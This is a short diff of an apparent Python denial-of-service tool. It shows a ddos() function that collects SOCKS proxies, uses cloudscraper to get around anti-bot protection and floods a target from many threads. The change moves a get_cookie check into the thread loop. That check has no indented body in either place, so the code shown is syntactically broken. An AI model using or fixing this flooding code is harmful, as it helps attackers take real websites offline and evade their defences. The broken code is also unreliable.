@@ -2506,7 +2506,6 @@ def Headerss(method):
 def ddos():
     socksCrawler()
     socksCrawlz()
-    if get_cookie(target):
     session = requests.Session()
     scraper = cloudscraper.create_scraper(sess=session)
     jar = RequestsCookieJar()
@@ -2658,5 +2657,6 @@ def ddos():
 
 
 for y in range(threads):
+    if get_cookie(target):
     th = threading.Thread(target = ddos)
     th.start()
